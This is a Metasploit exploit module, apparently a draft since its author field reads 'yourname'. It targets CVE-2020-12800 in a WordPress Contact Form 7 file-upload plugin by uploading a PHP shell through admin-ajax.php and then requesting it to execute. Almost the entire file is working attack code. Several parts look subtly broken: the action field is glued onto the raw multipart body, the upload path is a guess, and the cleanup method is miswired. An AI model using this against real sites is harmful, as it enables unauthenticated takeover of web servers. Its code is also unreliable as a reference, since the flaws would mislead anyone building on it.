##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Drag and Drop Multiple File Upload for Contact Form 7 Unauthenticated RCE',
        'Description' => %q{
          This module exploits an unauthenticated PHP file upload vulnerability in the
          "Drag and Drop Multiple File Upload for Contact Form 7" WordPress plugin,
          versions before 1.3.3.3. The vulnerability allows unauthenticated users to upload
          arbitrary files, including PHP files, due to insufficient file type validation
          in the `dnd_codedropz_upload` AJAX action. This module requires the Contact Form 7
          plugin to be installed and activated on the target WordPress site.
        },
        'Author' => [
          'Austin Martin', # Original Researcher
          'yourname'  # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2020-12800'],
          ['EDB', '48520'],
          ['URL', 'https://github.com/amartinsec/CVE-2020-12800'],
          ['URL', 'https://packetstormsecurity.com/files/157837/'],
          ['URL', 'https://packetstormsecurity.com/files/157951/']
        ],
        'Platform' => ['php'],
        'Arch' => ARCH_PHP,
        'Targets' => [
          ['Automatic', {}]
        ],
        'Privileged' => false,
        'DisclosureDate' => '2020-05-26',
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'TARGETURI' => '/'
        }
      )
    )

    register_options(
      [
        OptString.new('UPLOAD_PATH', [true, 'The upload path to use. If empty, will attempt to find it.', '']),
        OptString.new('FILENAME', [false, 'The filename to use for the uploaded file.', 'shell.php'])
      ]
    )
  end

  def check
    check_plugin_version_from_readme('drag-and-drop-multiple-file-upload-contact-form-7', '1.3.3.3')
  end


  def exploit
    print_status("Exploiting #{peer}...")

    # Generate a random filename
    filename = datastore['FILENAME']
    php_payload = "<?php " + payload.encoded + " ?>"

    # Upload the PHP payload
    upload_path = datastore['UPLOAD_PATH']
    if upload_path.empty?
      # Attempt to determine the upload directory automatically.  This might need adjustment.
      print_status("Attempting to determine upload path automatically...")
      res = send_request_cgi(
        'uri'    => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'drag-and-drop-multiple-file-upload-contact-form-7', 'readme.txt'),
        'method' => 'GET'
      )

      if res && res.code == 200 && res.body.include?('stable tag:')
        print_good("Found readme.txt")
        # Try to extract the upload path.  This is a guess based on common patterns.
        upload_path = normalize_uri(target_uri.path, 'wp-content', 'uploads', 'dnd_uploads')  #Adjust if needed based on specific install.
        print_good("Assuming upload path is: #{upload_path}")
      else
        fail_with(Failure::NotFound, 'Could not determine upload path.  Please set UPLOAD_PATH manually.')
      end
    end

    print_status("Uploading PHP payload to #{upload_path} as #{filename}...")

    data = Rex::MIME::Message.new
    data.add_part(php_payload, 'application/x-php', 'binary', "form-data; name=\"file\"; filename=\"#{filename}\"")
    post_data = data.to_s
    post_to_url = normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php')

    res = send_request_cgi(
      'uri' => post_to_url,
      'method' => 'POST',
      'ctype' => "multipart/form-data; boundary=#{data.bound}",
      'data' => "action=dnd_codedropz_upload\r\n" + post_data
    )

    if res && res.code == 200 && res.body.include?('"success":true')
      print_good("File successfully uploaded!")

      # Execute the uploaded PHP file
      shell_url = normalize_uri(upload_path, filename)
      print_status("Executing the uploaded file: #{shell_url}")

      res = send_request_cgi(
        'uri' => shell_url,
        'method' => 'GET'
      )

      if res && res.code == 200
        print_status("Payload executed successfully.  Check for a session.")
      elsif res
        print_error("Failed to execute payload: #{res.code} #{res.message}")
      else
        print_error("Failed to execute payload: No response received.")
      end

      register_files_for_cleanup(filename)

    else
      print_error("File upload failed.")
      if res
        print_error("Server Response Code: #{res.code}")
        print_error("Server Response Body: #{res.body}")
      else
        print_error("No response from server.")
      end
      fail_with(Failure::UnexpectedReply, 'File upload failed.')
    end
  end


  def register_files_for_cleanup(filename)
    # Register the uploaded file for cleanup.  Use the full path.
    shell_url = normalize_uri(datastore['UPLOAD_PATH'], filename)
    register_resource(shell_url)
  end
end